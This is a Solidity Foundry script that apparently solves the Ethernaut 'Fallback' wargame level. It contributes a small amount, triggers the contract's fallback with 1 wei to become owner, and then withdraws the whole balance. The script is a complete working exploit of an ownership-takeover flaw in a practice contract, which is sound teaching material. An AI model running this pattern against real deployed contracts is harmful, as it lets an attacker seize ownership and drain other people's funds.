// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import {Fallback} from "src/Fallback.sol";

contract Level0Solve is Script{
    Fallback public level1 = Fallback(payable(0x67B71283A3a53C445f33Ea0a0F8E435cD1f283E1));
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Original Owner : ", level1.owner());        
        
        level1.contribute{value: 0.0001 ether}();
        address(level1).call{value: 1 wei}("");

        console.log("New Owner : ", level1.owner());
        console.log("Initial Balance : ", address(level1).balance);
        level1.withdraw();
        console.log("Final Balance : ", address(level1).balance);
        vm.stopBroadcast();
    }
}